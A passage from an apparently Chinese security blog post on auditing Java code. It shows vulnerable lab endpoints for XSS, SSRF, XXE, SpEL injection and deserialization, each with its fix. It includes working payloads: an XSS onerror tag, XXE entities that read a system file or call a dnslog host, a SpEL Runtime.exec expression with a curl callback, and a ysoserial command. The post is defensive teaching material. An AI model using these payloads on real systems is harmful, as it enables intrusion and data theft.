&lt;%&#x3D;comment.get(&quot;date&quot;)%&gt; 发表回复：&lt;&#x2F;p&gt;\n                    &lt;p style&#x3D;&quot;margin: 15px 0 5px 0; font-size: 12px;&quot;&gt;\n                    &lt;pre&gt;&lt;%&#x3D;comment.get(&quot;content&quot;)%&gt;&lt;&#x2F;pre&gt;\n                    &lt;&#x2F;p&gt;\n                &lt;&#x2F;div&gt;\n            &lt;&#x2F;dd&gt;\n            &lt;%\n                    &#125;\n                &#125;\n            %&gt;\n        &lt;&#x2F;dl&gt;\n    &lt;&#x2F;div&gt;\n    &lt;div style&#x3D;&quot;background-color: #fff; border: 1px solid #C6C6C6;&quot;&gt;\n        &lt;form action&#x3D;&quot;#&quot; method&#x3D;&quot;POST&quot; style&#x3D;&quot;margin: 20px;&quot;&gt;\n            昵称: &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;username&quot; style&#x3D;&quot;width:250px; height: 28px;&quot;&#x2F;&gt;&lt;br&#x2F;&gt;&lt;br&#x2F;&gt;\n            &lt;textarea name&#x3D;&quot;content&quot; style&#x3D;&quot;overflow: auto;width: 100%; height: 250px;&quot;&gt;&lt;&#x2F;textarea&gt;\n            &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;提交留言&quot; style&#x3D;&quot;margin-top: 20px; width: 80px; height: 30px;&quot;&#x2F;&gt;\n        &lt;&#x2F;form&gt;\n    &lt;&#x2F;div&gt;\n&lt;&#x2F;div&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;</code></pre>\n\n<p>写了一个留言板页面，提交留言，刷新页面即可弹窗</p>\n<h2 id=\"DOM型：\"><a href=\"#DOM型：\" class=\"headerlink\" title=\"DOM型：\"></a>DOM型：</h2><p>这种类型我用漏扫扫描出来的最多。但是，老实说，我以前压根不知道这种怎么利用。</p>\n<p>原理这篇简短实用：<a href=\"https://blog.csdn.net/weixin_42299862/article/details/111302174\">https://blog.csdn.net/weixin_42299862/article/details/111302174</a></p>\n<p>Javasec：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&lt;%@ page contentType&#x3D;&quot;text&#x2F;html;charset&#x3D;UTF-8&quot; language&#x3D;&quot;java&quot; %&gt;\nDate: &lt;span style&#x3D;&quot;color: red;&quot;&gt;&lt;&#x2F;span&gt;\n&lt;input type&#x3D;&quot;hidden&quot; value&#x3D;&quot;&lt;%&#x3D;request.getParameter(&quot;date&quot;)%&gt;&quot; &#x2F;&gt;\n&lt;script&gt;\n    var date &#x3D; document.getElementsByTagName(&quot;input&quot;)[0].value;\n    document.getElementsByTagName(&quot;span&quot;)[0].innerHTML &#x3D; date;\n&lt;&#x2F;script&gt;</code></pre>\n\n<p>正常是data输入时间，页面输出时间。当data为img标签就会弹窗：</p>\n<p>data=&lt;**mg src=1 onerror=alert(/xss/) */*&gt;</p>\n<h2 id=\"修复：-4\"><a href=\"#修复：-4\" class=\"headerlink\" title=\"修复：\"></a>修复：</h2><p>xss的修复，意见都一致，就是过滤相应的符号标签。实现类似于php的htmlspecialchars函数的功能。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@RequestMapping(&quot;&#x2F;safe&quot;)\n    @ResponseBody\n    public static String safe(String xss) &#123;\n        return encode(xss);\n    &#125;\n\n    private static String encode(String origin) &#123;\n     &#x2F;*   origin &#x3D; StringUtils.replace(origin, &quot;&amp;&quot;, &quot;&amp;&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&lt;&quot;, &quot;&lt;&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&gt;&quot;, &quot;&gt;&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;\\&quot;&quot;, &quot;&quot;&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&#39;&quot;, &quot;&amp;#x27;&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&#x2F;&quot;, &quot;&#x2F;&quot;);*&#x2F;\n        origin &#x3D; StringUtils.replace(origin, &quot;&amp;&quot;, &quot;＆&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&lt;&quot;, &quot;＜&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&gt;&quot;, &quot;＞&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;\\&quot;&quot;, &quot;＼&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&#39;&quot;, &quot;＇&quot;);\n        origin &#x3D; StringUtils.replace(origin, &quot;&#x2F;&quot;, &quot;／&quot;);\n        return origin;\n    &#125;\n&#125;</code></pre>\n\n<p>这是视频作者的两种过滤方式，一种将符号转化为html实体字符，一种将英文标签转化为中文标签。</p>\n<p>Javasec修复：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;**\n * 实现htmlSpecialChars函数把一些预定义的字符转换为HTML实体编码\n *\n * @param content 输入的字符串内容\n * @return HTML实体化转义后的字符串\n *&#x2F;\npublic static String htmlSpecialChars(String content) &#123;\n  if (content &#x3D;&#x3D; null) &#123;\n    return null;\n  &#125;\n\n  char[]        charArray &#x3D; content.toCharArray();\n  StringBuilder sb        &#x3D; new StringBuilder();\n\n  for (char c : charArray) &#123;\n    switch (c) &#123;\n      case &#39;&amp;&#39;:\n        sb.append(&quot;&amp;&quot;);\n        break;\n      case &#39;&quot;&#39;:\n        sb.append(&quot;&quot;&quot;);\n        break;\n      case &#39;\\&#39;&#39;:\n        sb.append(&quot;&amp;#039;&quot;);\n        break;\n      case &#39;&lt;&#39;:\n        sb.append(&quot;&lt;&quot;);\n        break;\n      case &#39;&gt;&#39;:\n        sb.append(&quot;&gt;&quot;);\n        break;\n      default:\n        sb.append(c);\n        break;\n    &#125;\n  &#125;\n\n  return sb.toString();\n&#125;</code></pre>\n\n<p>就是换成html实体标签。</p>\n<p>还有就是全局过滤器的设置，Javasec全局过滤器：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">package com.anbai.sec.vuls.filter;\n\nimport javax.servlet.*;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletRequestWrapper;\nimport java.io.IOException;\n\npublic class XSSFilter implements Filter &#123;\n\n    @Override\n    public void init(FilterConfig filterConfig) &#123;\n\n    &#125;\n\n    @Override\n    public void doFilter(ServletRequest req, ServletResponse resp, FilterChain chain) throws IOException, ServletException &#123;\n        HttpServletRequest request &#x3D; (HttpServletRequest) req;\n\n        &#x2F;&#x2F; 创建HttpServletRequestWrapper，包装原HttpServletRequest对象，示例程序只重写了getParameter方法，\n        &#x2F;&#x2F; 应当考虑如何过滤：getParameter、getParameterValues、getParameterMap、getInputStream、getReader\n        HttpServletRequestWrapper requestWrapper &#x3D; new HttpServletRequestWrapper(request) &#123;\n            public String getParameter(String name) &#123;\n                &#x2F;&#x2F; 获取参数值\n                String value &#x3D; super.getParameter(name);\n\n                &#x2F;&#x2F; 简单转义参数值中的特殊字符\n                return value.replace(&quot;&amp;&quot;, &quot;&amp;&quot;).replace(&quot;&lt;&quot;, &quot;&lt;&quot;).replace(&quot;&#39;&quot;, &quot;&amp;#039;&quot;);\n            &#125;\n        &#125;;\n\n        chain.doFilter(requestWrapper, resp);\n    &#125;\n\n    @Override\n    public void destroy() &#123;\n\n    &#125;\n\n&#125;</code></pre>\n\n<p>web.xml配置：</p>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\">&lt;!-- XSS过滤器 --&gt;\n&lt;filter&gt;\n  &lt;filter-name&gt;XSSFilter&lt;&#x2F;filter-name&gt;\n  &lt;filter-class&gt;com.anbai.sec.vuls.filter.XSSFilter&lt;&#x2F;filter-class&gt;\n&lt;&#x2F;filter&gt;\n\n&lt;filter-mapping&gt;\n  &lt;filter-name&gt;XSSFilter&lt;&#x2F;filter-name&gt;\n  &lt;url-pattern&gt;&#x2F;*&lt;&#x2F;url-pattern&gt;\n&lt;&#x2F;filter-mapping&gt;</code></pre>\n\n<h1 id=\"csrf：\"><a href=\"#csrf：\" class=\"headerlink\" title=\"csrf：\"></a>csrf：</h1><p>跨站请求伪造，修复方法就是添加token值。</p>\n<p>这个只有安全的代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@Controller\n    @RequestMapping(&quot;&#x2F;csrf&quot;)\n    public class CSRF &#123;\n\n        @GetMapping(&quot;&#x2F;&quot;)\n        public String index() &#123;\n            return &quot;form&quot;;\n        &#125;\n\n        @PostMapping(&quot;&#x2F;post&quot;)\n        @ResponseBody\n        public String post() &#123;\n            return &quot;CSRF passed.&quot;;\n        &#125;\n    &#125;</code></pre>\n\n<p>form.html：</p>\n<pre class=\"line-numbers language-html\" data-language=\"html\"><code class=\"language-html\">\n&lt;html xmlns:th&#x3D;&quot;http:&#x2F;&#x2F;www.thymeleaf.org&quot; lang&#x3D;&quot;en&quot;&gt;\n&lt;head&gt;\n    &lt;script th:src&#x3D;&quot;@&#123;https:&#x2F;&#x2F;code.jquery.com&#x2F;jquery-3.4.1.min.js&#125;&quot;&gt;&lt;&#x2F;script&gt;\n&lt;&#x2F;head&gt;\n&lt;body&gt;\n&lt;div&gt;\n    &lt;!-- th:action with Spring 3.2+ and Thymeleaf 2.1+ can automatically force Thymeleaf to include the CSRF token as a hidden field --&gt;\n    &lt;!-- &lt;form name&#x3D;&quot;f&quot; th:action&#x3D;&quot;@&#123;&#x2F;csrf&#x2F;post&#125;&quot; method&#x3D;&quot;post&quot;&gt; --&gt;\n    &lt;form name&#x3D;&quot;f&quot; action&#x3D;&quot;&#x2F;csrf&#x2F;post&quot; method&#x3D;&quot;post&quot;&gt;\n        &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;input&quot; &#x2F;&gt;\n        &lt;input type&#x3D;&quot;submit&quot; value&#x3D;&quot;Submit&quot; &#x2F;&gt;\n        &lt;input type&#x3D;&quot;hidden&quot; th:name&#x3D;&quot;$&#123;_csrf.parameterName&#125;&quot; th:value&#x3D;&quot;$&#123;_csrf.token&#125;&quot; &#x2F;&gt;\n    &lt;&#x2F;form&gt;\n&lt;&#x2F;div&gt;\n&lt;&#x2F;body&gt;\n&lt;&#x2F;html&gt;</code></pre>\n\n<p>最关键的就是那个hidden的input标签，生成了token值，并且自动验证。这个方法是带框架的csrf防御方法。不使用框架那就要在后端生成token。</p>\n<p>当正常登录访问，提交表单会自动验证token值，正确则进入post方法，错误则返回csrftoken验证错误。</p>\n<h1 id=\"ssrf：\"><a href=\"#ssrf：\" class=\"headerlink\" title=\"ssrf：\"></a>ssrf：</h1><p>服务端请求伪造</p>\n<p>Java支持的几种常见协议：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">file、ftp、http、https、jar、mailto、netdoc</code></pre>\n\n<p>漏洞代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@RequestMapping(value &#x3D; &quot;&#x2F;urlConnection&#x2F;vuln&quot;, method &#x3D; &#123;RequestMethod.POST, RequestMethod.GET&#125;)\n    public String URLConnectionVuln(String url) &#123;\n        return HttpUtils.URLConnection(url);\n    &#125;</code></pre>\n\n<p>URLConnect方法：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">public static String URLConnection(String url) &#123;\n       try &#123;\n           URL u &#x3D; new URL(url);\n           URLConnection urlConnection &#x3D; u.openConnection();\n           BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(urlConnection.getInputStream())); &#x2F;&#x2F;send request\n           &#x2F;&#x2F; BufferedReader in &#x3D; new BufferedReader(new InputStreamReader(u.openConnection().getInputStream()));\n           String inputLine;\n           StringBuilder html &#x3D; new StringBuilder();\n\n           while ((inputLine &#x3D; in.readLine()) !&#x3D; null) &#123;\n               html.append(inputLine);\n           &#125;\n           in.close();\n           return html.toString();\n       &#125; catch (Exception e) &#123;\n           logger.error(e.getMessage());\n           return e.getMessage();\n       &#125;\n   &#125;</code></pre>\n\n<p>获取url链接，通过openConnection打开链接，没有经过任何过滤。</p>\n<p>访问：<a href=\"http://localhost:8080/ssrf/urlConnection/vuln?url=http://baidu.com\">http://localhost:8080/ssrf/urlConnection/vuln?url=http://baidu.com</a></p>\n<p>会跳转到baidu.com，所以ssrf没有先30x，就是url跳转漏洞</p>\n<p>常见利用方式就是探测内网资产结合redis写shell</p>\n<h2 id=\"关键方法：\"><a href=\"#关键方法：\" class=\"headerlink\" title=\"关键方法：\"></a>关键方法：</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">URLConnection、openConnection、openStream、CloseableHttpAsyncClient</code></pre>\n\n<h2 id=\"修复：-5\"><a href=\"#修复：-5\" class=\"headerlink\" title=\"修复：\"></a>修复：</h2><p>视频作者的修复是只允许http，https协议。但是这个也能用来探测内网资产。</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">public static boolean isHttp(String url) &#123;\n       return url.startsWith(&quot;http:&#x2F;&#x2F;&quot;) || url.startsWith(&quot;https:&#x2F;&#x2F;&quot;);\n   &#125;</code></pre>\n\n<p>然后就是通过hook检查链接是否为内网资产。</p>\n<p>修复思路参考链接：<a href=\"https://blog.csdn.net/m0_67402118/article/details/125401069\">https://blog.csdn.net/m0_67402118/article/details/125401069</a></p>\n<h1 id=\"XXE：\"><a href=\"#XXE：\" class=\"headerlink\" title=\"XXE：\"></a>XXE：</h1><p>xxe支持protocol里的所有协议</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">http，https， file，ftp，mailto，jar，netdoc</code></pre>\n\n<p>利用和ssrf类似，探测内容，读取文件。同时还可以远程执行代码。</p>\n<h2 id=\"有回显：\"><a href=\"#有回显：\" class=\"headerlink\" title=\"有回显：\"></a>有回显：</h2><h3 id=\"DocumentBuilder：\"><a href=\"#DocumentBuilder：\" class=\"headerlink\" title=\"DocumentBuilder：\"></a>DocumentBuilder：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@RequestMapping(value &#x3D; &quot;&#x2F;DocumentBuilder&#x2F;vuln01&quot;, method &#x3D; RequestMethod.POST)\n   public String DocumentBuilderVuln01(HttpServletRequest request) &#123;\n       try &#123;\n           String body &#x3D; WebUtils.getRequestBody(request);\n           logger.info(body);\n           DocumentBuilderFactory dbf &#x3D; DocumentBuilderFactory.newInstance();\n           DocumentBuilder db &#x3D; dbf.newDocumentBuilder();\n           StringReader sr &#x3D; new StringReader(body);\n           InputSource is &#x3D; new InputSource(sr);\n           Document document &#x3D; db.parse(is);  &#x2F;&#x2F; parse xml\n\n           &#x2F;&#x2F; 遍历xml节点name和value\n           StringBuilder buf &#x3D; new StringBuilder();\n           NodeList rootNodeList &#x3D; document.getChildNodes();\n           for (int i &#x3D; 0; i &lt; rootNodeList.getLength(); i++) &#123;\n               Node rootNode &#x3D; rootNodeList.item(i);\n               NodeList child &#x3D; rootNode.getChildNodes();\n               for (int j &#x3D; 0; j &lt; child.getLength(); j++) &#123;\n                   Node node &#x3D; child.item(j);\n                   buf.append(String.format(&quot;%s: %s\\n&quot;, node.getNodeName(), node.getTextContent()));\n               &#125;\n           &#125;\n           sr.close();\n           return buf.toString();\n       &#125; catch (Exception e) &#123;\n           logger.error(e.toString());\n           return EXCEPT;\n       &#125;\n   &#125;</code></pre>\n\n<h3 id=\"payload：\"><a href=\"#payload：\" class=\"headerlink\" title=\"payload：\"></a>payload：</h3><pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;\n&lt;!DOCTYPE creds [\n&lt;!ENTITY goodies SYSTEM\n&quot;file:&#x2F;&#x2F;&#x2F;c:&#x2F;windows&#x2F;system.ini&quot;&gt; ]&gt;\n&lt;creds&gt;&amp;goodies;&lt;&#x2F;creds&gt;</code></pre>\n\n<h2 id=\"无回显：\"><a href=\"#无回显：\" class=\"headerlink\" title=\"无回显：\"></a>无回显：</h2><h3 id=\"xmlReader：\"><a href=\"#xmlReader：\" class=\"headerlink\" title=\"xmlReader：\"></a>xmlReader：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@PostMapping(&quot;&#x2F;xmlReader&#x2F;vuln&quot;)\n   public String xmlReaderVuln(HttpServletRequest request) &#123;\n       try &#123;\n           String body &#x3D; WebUtils.getRequestBody(request);\n           logger.info(body);\n           XMLReader xmlReader &#x3D; XMLReaderFactory.createXMLReader();\n           xmlReader.parse(new InputSource(new StringReader(body)));  &#x2F;&#x2F; parse xml\n           return &quot;xmlReader xxe vuln code&quot;;\n       &#125; catch (Exception e) &#123;\n           logger.error(e.toString());\n           return EXCEPT;\n       &#125;\n   &#125;</code></pre>\n\n<h3 id=\"payload：-1\"><a href=\"#payload：-1\" class=\"headerlink\" title=\"payload：\"></a>payload：</h3><p>借助dnslog平台</p>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;\n    &lt;!DOCTYPE ANY \n    [&lt;!ENTITY xxe SYSTEM &quot;http:&#x2F;&#x2F;obfz0y.dnslog.cn&quot; &gt;]\n     &gt;\n     &lt;value&gt;&amp;xxe;&lt;&#x2F;value&gt;</code></pre>\n\n<h3 id=\"SAXBuilder：\"><a href=\"#SAXBuilder：\" class=\"headerlink\" title=\"SAXBuilder：\"></a>SAXBuilder：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@RequestMapping(value &#x3D; &quot;&#x2F;SAXBuilder&#x2F;vuln&quot;, method &#x3D; RequestMethod.POST)\n    public String SAXBuilderVuln(HttpServletRequest request) &#123;\n        try &#123;\n            String body &#x3D; WebUtils.getRequestBody(request);\n            logger.info(body);\n\n            SAXBuilder builder &#x3D; new SAXBuilder();\n            &#x2F;&#x2F; org.jdom2.Document document\n            builder.build(new InputSource(new StringReader(body)));  &#x2F;&#x2F; cause xxe\n            return &quot;SAXBuilder xxe vuln code&quot;;\n        &#125; catch (Exception e) &#123;\n            logger.error(e.toString());\n            return EXCEPT;\n        &#125;\n    &#125;</code></pre>\n\n<h3 id=\"SAXPeader：\"><a href=\"#SAXPeader：\" class=\"headerlink\" title=\"SAXPeader：\"></a>SAXPeader：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;&#x2F;&#x2F;&#x2F;saxReader是第三方的库，该类是无回显的\n   @RequestMapping(value &#x3D; &quot;&#x2F;SAXReader&#x2F;vuln&quot;, method &#x3D; RequestMethod.POST)\n   public String SAXReaderVuln(HttpServletRequest request) &#123;\n       try &#123;\n           String body &#x3D; WebUtils.getRequestBody(request);\n           logger.info(body);\n\n           SAXReader reader &#x3D; new SAXReader();\n           &#x2F;&#x2F; org.dom4j.Document document\n           reader.read(new InputSource(new StringReader(body))); &#x2F;&#x2F; cause xxe\n\n       &#125; catch (Exception e) &#123;\n           logger.error(e.toString());\n           return EXCEPT;\n       &#125;\n\n       return &quot;SAXReader xxe vuln code&quot;;\n   &#125;</code></pre>\n\n<h3 id=\"SAXParser：\"><a href=\"#SAXParser：\" class=\"headerlink\" title=\"SAXParser：\"></a>SAXParser：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;&#x2F;该类也是JDK内置的类，但他不可回显内容，可借助dnslog平台\n    @RequestMapping(value &#x3D; &quot;&#x2F;SAXParser&#x2F;vuln&quot;, method &#x3D; RequestMethod.POST)\n    public String SAXParserVuln(HttpServletRequest request) &#123;\n        try &#123;\n            String body &#x3D; WebUtils.getRequestBody(request);\n            logger.info(body);\n\n            SAXParserFactory spf &#x3D; SAXParserFactory.newInstance();\n            SAXParser parser &#x3D; spf.newSAXParser();\n            parser.parse(new InputSource(new StringReader(body)), new DefaultHandler());  &#x2F;&#x2F; parse xml\n\n            return &quot;SAXParser xxe vuln code&quot;;\n        &#125; catch (Exception e) &#123;\n            logger.error(e.toString());\n            return EXCEPT;\n        &#125;\n    &#125;</code></pre>\n\n<h3 id=\"Digester：\"><a href=\"#Digester：\" class=\"headerlink\" title=\"Digester：\"></a>Digester：</h3><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@RequestMapping(value &#x3D; &quot;&#x2F;Digester&#x2F;vuln&quot;, method &#x3D; RequestMethod.POST)\n   public String DigesterVuln(HttpServletRequest request) &#123;\n       try &#123;\n           String body &#x3D; WebUtils.getRequestBody(request);\n           logger.info(body);\n\n           Digester digester &#x3D; new Digester();\n           digester.parse(new StringReader(body));  &#x2F;&#x2F; parse xml\n       &#125; catch (Exception e) &#123;\n           logger.error(e.toString());\n           return EXCEPT;\n       &#125;\n       return &quot;Digester xxe vuln code&quot;;\n   &#125;</code></pre>\n\n<h2 id=\"修复：-6\"><a href=\"#修复：-6\" class=\"headerlink\" title=\"修复：\"></a>修复：</h2><pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">@RequestMapping(value &#x3D; &quot;&#x2F;xmlReader&#x2F;sec&quot;, method &#x3D; RequestMethod.POST)\n   public String xmlReaderSec(HttpServletRequest request) &#123;\n       try &#123;\n           String body &#x3D; WebUtils.getRequestBody(request);\n           logger.info(body);\n\n           XMLReader xmlReader &#x3D; XMLReaderFactory.createXMLReader();\n           &#x2F;&#x2F; fix code start\n           xmlReader.setFeature(&quot;http:&#x2F;&#x2F;apache.org&#x2F;xml&#x2F;features&#x2F;disallow-doctype-decl&quot;, true);\n           xmlReader.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-general-entities&quot;, false);\n           xmlReader.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-parameter-entities&quot;, false);\n           &#x2F;&#x2F;fix code end\n           xmlReader.parse(new InputSource(new StringReader(body)));  &#x2F;&#x2F; parse xml\n\n       &#125; catch (Exception e) &#123;\n           logger.error(e.toString());\n           return EXCEPT;\n       &#125;\n\n       return &quot;xmlReader xxe security code&quot;;\n   &#125;</code></pre>\n\n<p>通过这三行代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">xmlReader.setFeature(&quot;http:&#x2F;&#x2F;apache.org&#x2F;xml&#x2F;features&#x2F;disallow-doctype-decl&quot;, true);\nxmlReader.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-general-entities&quot;, false);\nxmlReader.setFeature(&quot;http:&#x2F;&#x2F;xml.org&#x2F;sax&#x2F;features&#x2F;external-parameter-entities&quot;, false);</code></pre>\n\n<h1 id=\"SPEL表达式注入：\"><a href=\"#SPEL表达式注入：\" class=\"headerlink\" title=\"SPEL表达式注入：\"></a>SPEL表达式注入：</h1><p><a href=\"https://www.freebuf.com/articles/web/344140.html\">https://www.freebuf.com/articles/web/344140.html</a></p>\n<p>maven导入：</p>\n<pre class=\"line-numbers language-xml\" data-language=\"xml\"><code class=\"language-xml\">&lt;properties&gt;\n\t&lt;org.springframework.version&gt;5.0.8.RELEASE&lt;&#x2F;org.springframework.version&gt;\n&lt;&#x2F;properties&gt;\n\n&lt;dependency&gt;\n\t&lt;groupId&gt;org.springframework&lt;&#x2F;groupId&gt;\n\t&lt;artifactId&gt;spring-expression&lt;&#x2F;artifactId&gt;\n\t&lt;version&gt;$&#123;org.springframework.version&#125;&lt;&#x2F;version&gt;\n&lt;&#x2F;dependency&gt;</code></pre>\n\n<p>利用条件：</p>\n<ol>\n<li>表达式未过滤，，或者过滤不严谨</li>\n<li>解析表达式后使用了getvalue/setvalue方法</li>\n<li>使用StandardEvaluationContext(默认)作为上下文对象</li>\n</ol>\n<p>漏洞代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;**\n     * SpEL to RCE\n     * http:&#x2F;&#x2F;localhost:8080&#x2F;spel&#x2F;vul&#x2F;?expression&#x3D;xxx.\n     * xxx is urlencode(exp)\n     * exp: T(java.lang.Runtime).getRuntime().exec(&quot;curl xxx.ceye.io&quot;)\n     *&#x2F;\n    @GetMapping(&quot;&#x2F;spel&#x2F;vuln&quot;)\n    public String rce(String expression) &#123;\n        ExpressionParser parser &#x3D; new SpelExpressionParser();\n        &#x2F;&#x2F; fix method: SimpleEvaluationContext\n        Expression expression1 &#x3D; parser.parseExpression(expression);\n        Object obje &#x3D; expression1.getValue();\n        String obj_str &#x3D; obje.toString();\n        return obj_str;\n\t&#125;</code></pre>\n\n<p>访问：<a href=\"http://localhost:8080/spel/vuln/?expression=T(java.lang.Runtime).getRuntime().exec(%22calc%22)\">http://localhost:8080/spel/vuln/?expression=T(java.lang.Runtime).getRuntime().exec(%22calc%22)</a></p>\n<p>即可弹出计算器</p>\n<h2 id=\"关键字：\"><a href=\"#关键字：\" class=\"headerlink\" title=\"关键字：\"></a>关键字：</h2><pre class=\"line-numbers language-none\"><code class=\"language-none\">org.springframework.expression.spel.standard\nexpression.setValue()\nexpression.getValue()</code></pre>\n\n<h2 id=\"修复：-7\"><a href=\"#修复：-7\" class=\"headerlink\" title=\"修复：\"></a>修复：</h2><p>使用SimpleEvaluationContext替换StandardEvaluationContext</p>\n<p>SimpleEvaluationContext是StandardEvaluationContext的子集，这个表达式不包括Java类型引用，构造函数和bean引用。</p>\n<h1 id=\"Java反序列化漏洞：\"><a href=\"#Java反序列化漏洞：\" class=\"headerlink\" title=\"Java反序列化漏洞：\"></a>Java反序列化漏洞：</h1><p>这个漏洞就是Java漏洞的大头，很多严重的漏洞都是因为反序列化的时候没做好限制导致的。</p>\n<h2 id=\"简单了解：\"><a href=\"#简单了解：\" class=\"headerlink\" title=\"简单了解：\"></a>简单了解：</h2><p>漏洞代码：</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;**\n* java -jar ysoserial.jar CommonsCollections5 &quot;open -a Calculator&quot; | base64\n* Add the result to rememberMe cookie.\n* &lt;p&gt;\n* http:&#x2F;&#x2F;localhost:8080&#x2F;deserialize&#x2F;rememberMe&#x2F;vuln\n*&#x2F;\n@RequestMapping(&quot;&#x2F;rememberMe&#x2F;vuln&quot;)\n    public String rememberMeVul(HttpServletRequest request)\n    throws IOException, ClassNotFoundException &#123;\n\n    Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);\n\n    if (null &#x3D;&#x3D; cookie) &#123;\n        return &quot;No rememberMe cookie. Right?&quot;;\n    &#125;\n\n    String rememberMe &#x3D; cookie.getValue();\n    byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);\n\n    ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);\n    ObjectInputStream in &#x3D; new ObjectInputStream(bytes);\n    in.readObject();\n    in.close();\n\n    return &quot;Are u ok?&quot;;\n&#125;</code></pre>\n\n<p>获取cookie中的rememberMe字段，先base64解码，之后直接反序列化</p>\n<p>利用就是使用yso生成cc5的链子</p>\n<pre class=\"line-numbers language-none\"><code class=\"language-none\">java -jar ysoserial-all.jar CommonsCollections5 &quot;calc&quot; | base64</code></pre>\n\n<p>之后就是填入cookie的rememberMe字段，没有就添加</p>\n<h2 id=\"修复：-8\"><a href=\"#修复：-8\" class=\"headerlink\" title=\"修复：\"></a>修复：</h2><p>使用RASP对代码hook，设置反序列化黑名单</p>\n<pre class=\"line-numbers language-java\" data-language=\"java\"><code class=\"language-java\">&#x2F;**\n     * Check deserialize class using black list.\n     * &lt;p&gt;\n     * http:&#x2F;&#x2F;localhost:8080&#x2F;deserialize&#x2F;rememberMe&#x2F;security\n     *&#x2F;\n    @RequestMapping(&quot;&#x2F;rememberMe&#x2F;security&quot;)\n    public String rememberMeBlackClassCheck(HttpServletRequest request)\n            throws IOException, ClassNotFoundException &#123;\n\n        Cookie cookie &#x3D; getCookie(request, Constants.REMEMBER_ME_COOKIE);\n\n        if (null &#x3D;&#x3D; cookie) &#123;\n            return &quot;No rememberMe cookie. Right?&quot;;\n        &#125;\n        String rememberMe &#x3D; cookie.getValue();\n        byte[] decoded &#x3D; Base64.getDecoder().decode(rememberMe);\n\n        ByteArrayInputStream bytes &#x3D; new ByteArrayInputStream(decoded);\n\n        try &#123;\n            AntObjectInputStream in &#x3D; new AntObjectInputStream(bytes);  &#x2F;&#x2F; throw InvalidClassException\n            in.readObject();\n            in.close();\n        &#125; catch (InvalidClassException e) &#123;\n            logger.info(e.toString());\n            return e.toString();\n        &#125;\n\n        return &quot;I&#39;m very OK.&quot;;\n    &#125;\n</code></pre>\n\n<p>修复类就不列出来了</p>\n<p>反序列化太多了，知名的shiro、fastjson、weblogic、struts2等。还有Java原生反序列化利用链。等等。。。。。</p>\n<p>入门Java反序列化推荐代码审计星球里的教程</p>\n<h1 id=\"小结：\"><a href=\"#小结：\" class=\"headerlink\" title=\"小结：\"></a>小结：</h1><p>基本漏洞跟php没什么区别，就是框架不同。也就反序列化漏洞两种语言的特性有点不同。</p>\n<p>然后就是审计工具，fortify要收集一些最新的规则。</p>\n","text":" 环境搭建：视频教程地址：https://www.bilibili.com/video/BV11t4y1n7KU/?share_source=copy_web&amp;vd_source=8ca6ac59b747f3cadc0c59cff919b9e5 文档地址：https://...","link":"","photos":[],"count_time":{"symbolsCount":"57k","symbolsTime":"52 mins."},"categories":[{"name":"代码审计","slug":"代码审计","count":7,"path":"api/categories/代码审计.json"}],"tags":[{"name":"Java","slug":"Java","count":16,"path":"api/tags/Java.json"}],"toc":"<ol class=\"toc\"><li class=\"toc-item toc-level-1\"><a class=\"toc-link\" href=\"#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA%EF%BC%9A\"><span 